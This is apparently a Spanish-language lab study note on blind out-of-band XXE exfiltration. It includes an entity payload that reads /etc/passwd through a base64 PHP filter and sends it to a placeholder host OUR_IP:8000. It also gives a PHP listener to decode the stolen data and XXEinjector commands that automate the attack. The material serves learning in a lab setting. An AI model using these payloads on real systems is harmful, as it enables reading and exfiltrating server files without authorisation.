## Exfiltracion de datos fuera de banda

Ahora iremos a `/blind` dentro de la pagina web donde no funcionaran ninguno de los metodos anteriores

Esto se debe a que no tenemos forma de que se imprima ninguno

Antes estabamos usando un ataque fuera de banda al alojar el DTD en nuestra Kali de forma externa. Este ataque sera similar solo que pediremos al webserver que en vez de mostrar la entidad file en un XML especifico, lo mande a nuestra maquina kali externa mediante una solicitud web

1. Montamos una entidad para el contenido del archivo que estamos leyendo usando el PHP Filter para codificarlo en base64 y crearemos otra entidad que se referira a nuestra IP donde se alojara file como parte de la URL en un parametro GET:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

2. Creamos un script sencillo en PHP para que decodifique directamente el base64 cuando llegue y levantamos el listener:

```
<?php if(isset($_GET['content'])){ error_log("\n\n" . base64_decode($_GET['content'])); } ?>
```

```
vi index.php
php -S 0.0.0.0:8000
```

```

	%remote; 
	%oob; 
]>
...
&content;
```

## Exfiltracion OOB automatizada

Podemos automatizar el proceso de exfiltracion a ciegas usando [XXEinjector](https://github.com/enjoiz/XXEinjector)

Soporta la mayoria de trucos como XXE basico, exfiltracion con CDATA, XXE basado en errores y XXE OOB

```
git clone https://github.com/enjoiz/XXEinjector.git
```

#### Uso

Para usarla copiamos la solicitud HTTP desde burp en un archivo que usara la herrmienta. Solo necesitamos hasta la Declaracion XML y despues poner `XXEINJECT`

![[Pasted image 20260725010747.png]]


```
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
![[Pasted image 20260725010846.png]]

Vemos que no imprimio los datos directamente y se debe a que lo estamos codificando en BASE64. Podemos leer los logs para ver el archivo exfiltrado

```
cat Logs/10.129.201.94/etc/passwd.log
```
![[Pasted image 20260725010935.png]]
